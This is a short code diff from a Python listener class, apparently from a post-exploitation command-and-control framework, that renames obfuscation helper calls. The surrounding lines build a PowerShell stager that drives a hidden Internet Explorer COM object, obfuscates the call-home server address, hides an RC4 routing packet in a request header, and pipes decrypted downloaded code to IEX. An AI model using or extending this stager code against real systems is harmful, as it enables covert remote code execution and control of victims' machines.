@@ -338,7 +338,7 @@ class Listener(object):
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
+                stager += "$ser=" + data_util.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
 
                 # add the RC4 packet to a header location
                 stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
@@ -373,7 +373,7 @@ class Listener(object):
                     "-join[Char[]](& $R $data ($IV+$" + helpers.generate_random_script_var_name("K") + ")) | IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
+                    stager = data_util.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -463,7 +463,7 @@ class Listener(object):
                         randomizedStager += line
 
             if obfuscate:
-                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager,
+                randomizedStager = data_util.obfuscate(self.mainMenu.installPath, randomizedStager,
                                                      obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
             if encode:
@@ -526,7 +526,7 @@ class Listener(object):
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
             if obfuscate:
-                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
+                code = data_util.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
             return code
 
         else:
